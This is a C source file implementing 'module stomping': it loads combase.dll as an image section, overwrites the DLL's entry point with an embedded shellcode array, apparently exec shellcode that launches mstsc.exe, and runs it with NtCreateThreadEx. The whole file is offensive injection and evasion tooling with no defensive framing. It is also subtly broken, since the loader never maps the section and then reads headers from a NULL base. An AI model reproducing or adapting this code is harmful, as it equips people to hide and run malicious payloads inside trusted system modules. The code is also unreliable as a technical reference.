#include <Windows.h>
#include <stdio.h>
#include "Structs.h"

// Macro for printing Windows API errors
#define PwinErr(szWnApiName) wprintf(L"[!] --- %s WinAPI Failed With Error Code: %d\n", szWnApiName, GetLastError());

// Macro for printing NT API errors
#define PntError(szNtApiName, NtErr) wprintf(L"[!] --- %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);


// Macro for safely deleting handles
#define DELETE_HANDLE(H) \
    if (H != NULL && H != INVALID_HANDLE_VALUE) { \
        CloseHandle(H); \
        H = NULL; \
    }

// Structure to hold pointers to NT API functions
typedef struct _NTAPIFP {
    fnNtCreateSection       pNtCreateSection;
    fnNtMapViewOfSection    pNtMapViewOfSection;
    fnNtCreateThreadEx      pNtCreateThreadEx;
} NTAPIFP, *PNTAPIFP;

NTAPIFP g_NtApi = { 0x00 };

// Function to manually map a DLL file into the local process.
// Parameters:
// szDllFilePath: String holding the path to the DLL file (Unicode)
// phModule: Pointer to a handle that will receive the module handle of the mapped DLL
// puEntryPoint: Pointer to a variable that will receive the entry point address of the mapped DLL
// Returns TRUE if successful, FALSE otherwise.
BOOL LoadDLLFile(_In_ LPCWSTR szDllFilePath, _Out_ HMODULE* phModule, _Out_ PULONG_PTR puEntryPoint) {
    HANDLE hFile = INVALID_HANDLE_VALUE, hSection = NULL;
    NTSTATUS STATUS = STATUS_SUCCESS;
    ULONG_PTR uMappedModule = (ULONG_PTR)NULL;
    SIZE_T sViewSize = (SIZE_T)NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;

    // Check if parameters contain valid values
    if (!szDllFilePath || !phModule || !puEntryPoint)
        return FALSE;

    // Open the specified DLL file to check if it exists on the system
    if ((hFile = CreateFileW(szDllFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        PwinErr(TEXT("CreateFileW"));
        goto _CleanUp;
    }

    // Create a section object with read-only and SEC_IMAGE attributes
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
        PntError(TEXT("NtCreateSection"), STATUS);
        goto _CleanUp;
    }

    // Close the file handle as it's no longer needed
    DELETE_HANDLE(hFile);

    // Check if it's a valid PE header
    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        goto _CleanUp;

    // Dereference values to the correct parameters
    *phModule = (HMODULE)uMappedModule;
    *puEntryPoint = uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

    _CleanUp:
    // Clean up resources
    DELETE_HANDLE(hFile);
    DELETE_HANDLE(hSection);

    // Return TRUE if both module handle and entry point are valid, otherwise return FALSE
    return (*phModule && *puEntryPoint) ? TRUE : FALSE;
}

// Function to verify if the .text section in the DLL is large enough to place the payload immediately after the Entry Point Base Address (EPBA).
// uSacrificialModule       -> Handle to the mapped module (returned by the LoadDLLFile function).
// uEntryPoint              -> The address of the sacrificial DLL entry point (returned by the LoadDLLFile function).
// sPayloadSize             -> Holds the size of the payload (in bytes).
BOOL VerifyTextSection(_In_ ULONG_PTR uSacrificialModule, _In_ ULONG_PTR uEntryPoint, _In_ SIZE_T sPayloadSize) {
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;
    ULONG_PTR uTextAddr = (ULONG_PTR)NULL;
    SIZE_T sTextSize = 0, sTextSizeLeft = 0;

    // Check if DLL holds valid PE headers
    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uSacrificialModule + ((PIMAGE_DOS_HEADER)uSacrificialModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] >> Invalid PE Header!\n");
        return FALSE;
    }

    // Get the pointer to the first section header
    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    // Iterate over the sections to find the .text section
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        // Check if the current section name is ".text"
        // the expression (*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.' is essentially comparing the name of the section header i in a PE file to the string 'xet.' by performing a bitwise OR operation and checking if the result matches the ASCII representation of 'xet.'. This is a common way to check if a section name matches a particular string in a PE file while accounting for little-endian byte order.
        if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
            uTextAddr = uSacrificialModule + pImgSecHdr[i].VirtualAddress;
            sTextSize = pImgSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    // Check if both the address and size of the .text section are non-zero
    if (!uTextAddr || !sTextSize) {
        printf("[!] >> .text section not found or has zero size!\n");
        return FALSE;
    }

    // Calculate the space left after the entry point for the payload
    sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddr);

    // Check if there's enough space after the entry point for the payload
    if (sTextSizeLeft < sPayloadSize) {
        printf("[!] >> Not enough space in .text section for payload!\n");
        return FALSE;
    }

    // Determine size between entry point and the end of .text section
    sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddr);

    printf("[+] >> Payload Size %d Byte\n", sPayloadSize);
    printf("[+] Available Memory: %d Byte\n", sTextSizeLeft);

    // .text section has enough space for the payload
    if (sTextSizeLeft >= sPayloadSize)
        return TRUE;

    return FALSE;
}

// Function calls LoadDLL + VerifyTextSection functions before injecting our shellcode
// szSacrificialDLL     -> Holds DLL Name
// pBuffer              -> Pointer to shellcode base address
// sBufferSize
BOOL ModuleStomping(_In_ LPCWSTR szSacrificialDLL, _In_ PBYTE pShellcode, _In_ SIZE_T pShellcodeSize) {
    NTSTATUS STATUS = STATUS_SUCCESS;
    HMODULE hSacrificialModule = NULL;
    ULONG_PTR uEntryPoint = (ULONG_PTR)NULL;
    HANDLE hThread = NULL;
    DWORD dwOldProtection = 0x00;

    // Check if parameters are valid
    if (!szSacrificialDLL || !pShellcode || !pShellcode)
        return FALSE;

    // Load the sacrificial DLL and retrieve its module handle and entry point
    if (!LoadDLLFile(szSacrificialDLL, &hSacrificialModule, &uEntryPoint))
        return FALSE;

    printf("[+] >>  %ws Loaded Successfully At: 0x%p \n", szSacrificialDLL, (PVOID)hSacrificialModule);
    printf("[+] >>  Entry Point: 0x%p \n", (PVOID)uEntryPoint);

    // Verify if the .text section of the DLL is large enough for the buffer
    if (!VerifyTextSection((ULONG_PTR)hSacrificialModule, uEntryPoint, pShellcodeSize))
        return FALSE;

    printf("[-] >> Press <Enter> To Start Module Stomping\n");
    getchar(); // Wait for user input

    // Change the protection of the memory region containing the entry point to allow writing
    if (!VirtualProtect((LPVOID)uEntryPoint, pShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
        PwinErr(TEXT("VirtualProtect"));
        return FALSE;
    }

    // Copy the buffer into the memory region of the entry point
    memcpy((LPVOID)uEntryPoint, pShellcode, pShellcodeSize);

    // Restore the original protection of the memory region
    if (!VirtualProtect((LPVOID)uEntryPoint, pShellcodeSize, dwOldProtection, &dwOldProtection)) {
        PwinErr(TEXT("VirtualProtect"));
        return FALSE;
    }

    printf("[-] >> Press <Enter> To Execute NtCreateThreadEx ... ");
    getchar(); // Wait for user input

    // Execute the code at the entry point using NtCreateThreadEx
    if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (PVOID)uEntryPoint, NULL, FALSE, 0x00, 0x00, 0x00, NULL))) {
        PntError(TEXT("NtCreateThreadEx"), STATUS);
        return FALSE;
    }

    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    // Return TRUE to indicate successful execution
    return TRUE;
}

// mstsc
unsigned char shellcode[] =
        { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
          0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
          0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
          0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
          0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
          0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
          0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
          0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
          0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
          0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
          0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
          0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
          0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
          0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
          0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
          0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
          0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
          0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
          0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
          0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
          0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
          0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
          0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6d,0x73,0x74,
          0x73,0x63,0x2e,0x65,0x78,0x65,0x00 };

#define DLL L"C:\\Windows\\System32\\combase.dll"

int main() {
    HMODULE hNtdll = NULL;

    if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
        return 1;

    g_NtApi.pNtCreateSection	    = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    g_NtApi.pNtMapViewOfSection	= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    g_NtApi.pNtCreateThreadEx	= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!g_NtApi.pNtCreateSection || !g_NtApi.pNtMapViewOfSection || !g_NtApi.pNtCreateThreadEx)
        return -1;

    if (!ModuleStomping(DLL, shellcode, sizeof(shellcode)))
        return -1;

    return 0;
}